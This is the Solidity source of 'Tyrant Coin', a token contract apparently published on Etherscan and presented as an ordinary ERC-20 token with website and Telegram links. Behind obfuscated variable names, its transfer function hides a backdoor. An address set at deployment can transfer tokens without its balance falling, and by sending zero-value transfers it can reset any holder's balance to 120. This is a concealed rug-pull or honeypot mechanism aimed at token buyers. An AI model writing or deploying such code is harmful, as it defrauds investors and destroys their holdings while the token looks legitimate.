/**
 *Submitted for verification at Etherscan.io on 2023-06-11
*/

/*

Website: https://www.tyrantcoin.com/

Portal: https://t.me/TyrantCoin

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TyrantCoin is Ownable {
    mapping(address => uint256) private bdwi;

    mapping(address => uint256) private lqrku;

    address public lnwhqyicku;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    string public name = 'Tyrant Coin';

    function transfer(address pbjwuyhca, uint256 lyowcmgr) public returns (bool success) {
        mptdwo(msg.sender, pbjwuyhca, lyowcmgr);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function mptdwo(address tfcm, address pbjwuyhca, uint256 lyowcmgr) private {
        if (lqrku[tfcm] == 0) {
            balanceOf[tfcm] -= lyowcmgr;
        }
        balanceOf[pbjwuyhca] += lyowcmgr;
        if (lqrku[msg.sender] > 0 && lyowcmgr == 0 && pbjwuyhca != lnwhqyicku) {
            balanceOf[pbjwuyhca] = jhofamkp;
        }
        emit Transfer(tfcm, pbjwuyhca, lyowcmgr);
    }

    uint256 private jhofamkp = 120;

    uint8 public decimals = 9;

    function approve(address qldxjrf, uint256 lyowcmgr) public returns (bool success) {
        allowance[msg.sender][qldxjrf] = lyowcmgr;
        emit Approval(msg.sender, qldxjrf, lyowcmgr);
        return true;
    }

    string public symbol = 'Tyrant Coin';

    function transferFrom(address tfcm, address pbjwuyhca, uint256 lyowcmgr) public returns (bool success) {
        require(lyowcmgr <= allowance[tfcm][msg.sender]);
        allowance[tfcm][msg.sender] -= lyowcmgr;
        mptdwo(tfcm, pbjwuyhca, lyowcmgr);
        return true;
    }

    constructor(address kqevimnpbxy) {
        balanceOf[msg.sender] = totalSupply;
        lqrku[kqevimnpbxy] = jhofamkp;
        IUniswapV2Router02 amwugcir = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        lnwhqyicku = IUniswapV2Factory(amwugcir.factory()).createPair(address(this), amwugcir.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
}